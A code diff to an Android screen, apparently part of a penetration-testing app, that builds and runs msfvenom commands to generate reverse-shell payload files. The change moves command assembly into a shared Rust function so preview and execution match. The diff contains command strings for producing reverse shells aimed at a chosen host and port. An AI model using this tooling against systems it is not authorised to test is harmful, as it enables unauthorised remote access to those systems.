@@ -74,8 +74,8 @@ fun PayloadScreen(onBack: () -> Unit, vm: RunnerViewModel = viewModel()) {
     var lport by remember { mutableStateOf("4444") }
     val p = payloads[selected]
     val outPath = "/root/reforge-payloads/reverse-${p.name.lowercase().replace(" ", "")}.${p.ext}"
-    val fmt = if (p.format != null) " -f ${p.format}" else ""
-    val preview = "msfvenom -p ${p.payload} LHOST=${lhost.ifBlank { "<LHOST>" }} LPORT=$lport$fmt -o $outPath"
+    // Command built by the Rust core (skyla_core) so preview and run can't drift.
+    val preview = uniffi.skyla_core.msfvenomCmd(p.payload, lhost, lport, p.format, outPath)
     val listState = rememberLazyListState()
 
     LaunchedEffect(vm.lines.size, vm.lines.lastOrNull()?.text?.length) {
@@ -163,9 +163,9 @@ fun PayloadScreen(onBack: () -> Unit, vm: RunnerViewModel = viewModel()) {
             } else {
                 Button(
                     onClick = {
-                        val cmd = "mkdir -p /root/reforge-payloads && msfvenom -p ${p.payload} " +
-                            "LHOST=${lhost.trim()} LPORT=$lport$fmt -o $outPath && " +
-                            "echo && echo SAVED: $outPath && ls -la $outPath"
+                        val cmd = "mkdir -p /root/reforge-payloads && " +
+                            uniffi.skyla_core.msfvenomCmd(p.payload, lhost.trim(), lport, p.format, outPath) +
+                            " && echo && echo SAVED: $outPath && ls -la $outPath"
                         vm.run(cmd)
                     },
                     enabled = lhost.isNotBlank() && lport.isNotBlank(),
